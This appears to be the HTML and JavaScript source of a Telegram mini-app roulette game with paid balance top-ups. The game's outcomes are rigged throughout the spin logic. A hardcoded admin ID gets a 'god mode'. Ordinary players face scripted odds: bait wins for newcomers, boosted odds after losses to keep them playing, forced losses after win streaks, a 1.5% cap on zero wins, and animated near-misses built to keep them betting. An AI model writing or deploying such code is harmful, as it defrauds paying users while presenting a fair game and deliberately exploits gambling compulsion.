<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TG Roulette</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background: #1a1a1a;
            color: #ffffff;
            font-family: sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            user-select: none;
        }
        .casino-box {
            background: #2c2c2c;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.7);
            text-align: center;
            width: 90%;
            max-width: 350px;
        }
        h2 { color: #f1c40f; margin: 0 0 15px 0; }
        
        .roulette-container {
            position: relative;
            width: 100%;
            height: 60px;
            background: #111;
            border: 3px solid #f1c40f;
            border-radius: 8px;
            margin: 20px 0;
            overflow: hidden;
        }
        .pointer {
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 4px;
            height: 100%;
            background: #f1c40f;
            z-index: 10;
            box-shadow: 0 0 8px #f1c40f;
        }
        .tape {
            display: flex;
            width: max-content;
            height: 100%;
            transform: translateX(0);
        }
        .cell {
            width: 50px;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 18px;
            border-right: 1px solid #222;
        }
        .red { background: #e74c3c; }
        .black { background: #2c3e50; }
        .zero { background: #2ecc71; }

        input {
            width: 80%;
            padding: 10px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: 2px solid #444;
            background: #111;
            color: #fff;
            font-size: 16px;
            text-align: center;
        }
        .btn-group {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 10px;
        }
        .bet-row {
            display: flex;
            gap: 8px;
        }
        .bet-btn {
            flex: 1;
            padding: 12px 5px;
            border: none;
            border-radius: 5px;
            font-weight: bold;
            color: white;
            cursor: pointer;
            font-size: 12px;
            transition: 0.2s;
        }
        .bet-btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .btn-red { background: #e74c3c; }
        .btn-black { background: #2c3e50; }
        .btn-zero { background: #2ecc71; }
        .btn-topup { background: #f1c40f; color: #000; border: none; padding: 10px; font-weight: bold; border-radius: 5px; cursor: pointer; font-size: 12px; }
    </style>
</head>
<body>

<div class="casino-box">
    <h2>🎰 LUXE SPIN 🎰</h2>
    
    <div class="roulette-container">
        <div class="pointer"></div>
        <div class="tape" id="roulette-tape"></div>
    </div>

    <input type="number" id="bet-amount" value="100" min="10">

    <div class="btn-group">
        <div class="bet-row">
            <button class="bet-btn btn-red" id="b-red" onclick="startSpin('red')">Красное x2</button>
            <button class="bet-btn btn-black" id="b-black" onclick="startSpin('black')">Черное x2</button>
            <button class="bet-btn btn-zero" id="b-zero" onclick="startSpin('zero')">Зеро x35</button>
        </div>
        <button class="btn-topup" onclick="triggerTopUp()">➕ Пополнить баланс (⭐)</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const order = [0, 32, 15, 19, 4, 21, 2, 25, 17, 34, 6, 27, 13, 36, 11, 30, 8, 23, 10, 5, 24, 16, 33, 1, 20, 14, 31, 9, 22, 18, 29, 7, 28, 12, 35, 3, 26];
    const RED_NUMBERS = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36];
    
    const tape = document.getElementById('roulette-tape');
    const cellWidth = 51; 

    let totalCells = [];
    for (let i = 0; i < 20; i++) { totalCells = totalCells.concat(order); }

    totalCells.forEach(num => {
        const cell = document.createElement('div');
        cell.className = 'cell';
        if (num === 0) cell.classList.add('zero');
        else if (RED_NUMBERS.includes(num)) cell.classList.add('red');
        else cell.classList.add('black');
        cell.innerText = num;
        tape.appendChild(cell);
    });

    const MY_TELEGRAM_ID = 6252715941; 
    let adminSpinCount = 0;
    let isSpinning = false;
    
    function startSpin(betType) {
        if (isSpinning) return;

        const amount = parseInt(document.getElementById('bet-amount').value);
        if (isNaN(amount) || amount <= 0) { alert('Введите сумму!'); return; }
    
        isSpinning = true;
        document.querySelectorAll('.bet-btn, .btn-topup').forEach(b => b.disabled = true);
    
        const currentUserId = tg.initDataUnsafe?.user?.id;
        let winningNumber;
        let forceNearMiss = false; 
        let targetPool = [];
    
        // 1. РЕЖИМ БОГА (ДЛЯ АДМИНА)
        if (currentUserId === MY_TELEGRAM_ID) {
            adminSpinCount++;
            let filterColor = (adminSpinCount % 2 === 0) ? betType : null;
            let winningNumbers = order.filter(num => {
                let color = num === 0 ? 'zero' : (RED_NUMBERS.includes(num) ? 'red' : 'black');
                return filterColor ? color === betType : color !== betType;
            });
            winningNumber = winningNumbers[Math.floor(Math.random() * winningNumbers.length)];
        } 
        // 2. ЗАЩИЩЕННЫЙ МАРКЕТИНГОВЫЙ АЛГОРИТМ
        else {
            let session = JSON.parse(localStorage.getItem('tg_casino_session')) || { spins: 0, winStreak: 0, lossStreak: 0 };
            session.spins++;

            let shouldWin = false;
            const roll = Math.random();

            // 🛡️ АНТИ-АБУЗ ЗЕРО: Если игрок пытается ставить на зелёное (выплата х35)
            if (betType === 'zero') {
                // Полностью отключаем дофаминовые фазы. Шанс выиграть на зеро залочен на 1.5% (безопасно для кассы)
                shouldWin = roll < 0.015; 

                if (shouldWin) {
                    targetPool = [0];
                } else {
                    // Включаем умный триггер: шарик падает на соседей Зеро (32 или 26) в 80% случаев проигрыша
                    if (Math.random() < 0.80) {
                        targetPool = [32, 26];
                        forceNearMiss = true;
                    } else {
                        targetPool = order.filter(num => num !== 0);
                    }
                }
            } 
            // КЛАССИЧЕСКИЙ МАРКЕТИНГ ДЛЯ СТАВОК НА ЦВЕТ Х2 (Красное / Черное)
            else {
                if (session.spins <= 3) {
                    shouldWin = roll < 0.80; // Приманка новичка
                } else if (session.lossStreak >= 2) {
                    shouldWin = roll < 0.65; // Удержание от тильта
                } else if (session.winStreak >= 2) {
                    shouldWin = false;
                    forceNearMiss = true;    // Слив после серии побед
                } else {
                    shouldWin = roll < 0.40; // Математический гринд
                    if (!shouldWin) forceNearMiss = Math.random() < 0.6;
                }

                // Наполняем пул чисел для Красного/Черного
                targetPool = order.filter(num => {
                    let color = num === 0 ? 'zero' : (RED_NUMBERS.includes(num) ? 'red' : 'black');
                    return shouldWin ? color === betType : color !== betType;
                });

                // Визуальный Near-Miss для ставок х2
                if (forceNearMiss && !shouldWin) {
                    let nearMissNumbers = targetPool.filter(num => {
                        let idx = order.indexOf(num);
                        let prevIdx = (idx - 1 + 37) % 37;
                        let nextIdx = (idx + 1) % 37;
                        
                        let prevNum = order[prevIdx];
                        let nextNum = order[nextIdx];
                        
                        let prevColor = prevNum === 0 ? 'zero' : (RED_NUMBERS.includes(prevNum) ? 'red' : 'black');
                        let nextColor = nextNum === 0 ? 'zero' : (RED_NUMBERS.includes(nextNum) ? 'red' : 'black');
                        
                        return prevColor === betType || nextColor === betType;
                    });
                    if (nearMissNumbers.length > 0) {
                        targetPool = nearMissNumbers;
                    }
                }
            }

            winningNumber = targetPool[Math.floor(Math.random() * targetPool.length)];

            // Обновляем сессию игрока
            if (shouldWin) {
                session.winStreak++;
                session.lossStreak = 0;
            } else {
                session.lossStreak++;
                session.winStreak = 0;
            }
            localStorage.setItem('tg_casino_session', JSON.stringify(session));
        }
    
        let finalColor = winningNumber === 0 ? 'zero' : (RED_NUMBERS.includes(winningNumber) ? 'red' : 'black');
        const isWin = finalColor === betType;

        // --- ВЫЧИСЛЕНИЕ ФИНАЛЬНОЙ ТОЧКИ АНИМАЦИИ ---
        tape.style.transition = 'none';
        
        const baseIndex = order.indexOf(winningNumber);
        const minCircles = 6; 
        const targetIndex = baseIndex + (37 * minCircles); 
        
        const containerWidth = document.querySelector('.roulette-container').offsetWidth;
        
        let randomInnerOffset = 0;
        if (forceNearMiss && !isWin) {
            let checkIdx = order.indexOf(winningNumber);
            let nextIdx = (checkIdx + 1) % 37;
            let nextNum = order[nextIdx];
            let nextColor = nextNum === 0 ? 'zero' : (RED_NUMBERS.includes(nextNum) ? 'red' : 'black');
            
            if (nextColor === betType || (betType === 'zero' && (winningNumber === 32 || winningNumber === 26))) {
                randomInnerOffset = (winningNumber === 32) ? -21 : 21; 
            } else {
                randomInnerOffset = Math.floor(Math.random() * 26) - 13;
            }
        } else {
            randomInnerOffset = Math.floor(Math.random() * 26) - 13; 
        }

        const targetX = -(targetIndex * cellWidth - containerWidth / 2 + cellWidth / 2 + randomInnerOffset);
    
        setTimeout(() => {
            tape.style.transition = 'transform 4.2s cubic-bezier(0.05, 0.7, 0.1, 1)';
            tape.style.transform = `translateX(${targetX}px)`;
        }, 50);
    
        setTimeout(() => {
            const betData = {
                bet_amount: amount,
                bet_type: betType,
                spin_result: winningNumber,
                win: isWin
            };
            
            tg.sendData(JSON.stringify(betData));
            
            isSpinning = false;
            document.querySelectorAll('.bet-btn, .btn-topup').forEach(b => b.disabled = false);
        }, 4500);
    }

    function triggerTopUp() {
        if (isSpinning) return;
        const topupData = { action: "request_topup" };
        tg.sendData(JSON.stringify(topupData));
    }
</script>
</body>
</html>
